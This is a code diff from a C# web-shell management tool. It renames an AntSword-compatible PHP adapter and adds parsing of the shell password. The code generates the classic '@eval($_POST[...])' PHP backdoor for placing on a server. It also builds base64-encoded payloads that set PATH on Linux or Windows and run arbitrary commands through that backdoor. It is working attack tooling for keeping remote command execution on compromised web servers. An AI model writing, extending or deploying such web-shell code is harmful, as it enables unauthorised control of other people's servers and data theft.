@@ -3,25 +3,26 @@ using System.Text;
 namespace Rod.Transport.WebShells;
 
 /// <summary>
-/// The AntSword-compatible PHP family (the open-source manager's eval
-/// one-liner, MIT): the server-side footprint is a single
-/// <c>@eval($_POST[...])</c> line, and every request builds its own
-/// wrapper -- the bootstrap parameter carries
+/// The universal one-liner PHP family: the placed script is the classic
+/// <c>&lt;?php @eval($_POST[...]); ?&gt;</c> line -- the shape every
+/// web-shell manager drives, which is why a script placed by hand or by
+/// another tool answers this client too (the interop falls out of the
+/// one-liner being universal, not from following anyone's product). Each
+/// request builds its own wrapper -- the connection parameter carries
 /// <c>@eval(@base64_decode($_POST['&lt;random&gt;']))</c>, the random
-/// parameter carries the base64 payload, and the payload itself frames
-/// its answer with random marker halves around a base64-encoded body.
-/// Nothing is baked into the placed file beyond the parameter name, which
-/// is what makes the family interoperable: a script placed for one client
-/// answers any client that speaks the shape.
+/// parameter carries the base64 payload, and the payload frames its
+/// answer with random marker halves around a base64-encoded body. The
+/// wire is the classic managers' shape; only the placed one-liner is
+/// baked in beyond the parameter name.
 ///
 /// The command runs through the standard, documented process functions --
 /// a PATH setup for both OS families and a read pipe, the plain shape the
 /// family's template uses. No function-fallback chains and no bypass
 /// logic: those belong to out-of-tree tradecraft (architecture.md Sec 13).
 /// </summary>
-public sealed class AntSwordPhpAdapter : IWebShellProtocolAdapter
+public sealed class EvalPhpAdapter : IWebShellProtocolAdapter
 {
-    public string Id => "antsword-php";
+    public string Id => "eval-php";
     public string ScriptLanguage => "php";
     public string DefaultEncoder => "base64";
     public string DefaultDecoder => "base64";
@@ -35,6 +36,16 @@ public sealed class AntSwordPhpAdapter : IWebShellProtocolAdapter
 
     public string RenderScript(string password)
         => $"<?php @eval($_POST['{password}']); ?>";
+
+    public string? ReadCredentialFromScript(string script)
+    {
+        var start = script.IndexOf("$_POST['", StringComparison.Ordinal);
+        if (start < 0)
+            return null;
+        var from = start + "$_POST['".Length;
+        var end = script.IndexOf("']", from, StringComparison.Ordinal);
+        return end < 0 ? null : script[from..end];
+    }
 
     public WebShellRequest EncodeCommand(
         string url,
@@ -62,7 +73,7 @@ public sealed class AntSwordPhpAdapter : IWebShellProtocolAdapter
             "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);"
             + $"$c=base64_decode('{commandEncoded}');"
             + "$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);"
-            + "if(substr($d,0,1)===\"/\"){"
+            + "if(substr($d,0,1)==\"/\"){"
             + "@putenv(\"PATH=\".getenv(\"PATH\").\":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\");"
             + "}else{"
             + "@putenv(\"PATH=\".getenv(\"PATH\").\";C:\\\\Windows\\\\system32;C:\\\\Windows;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\\");"
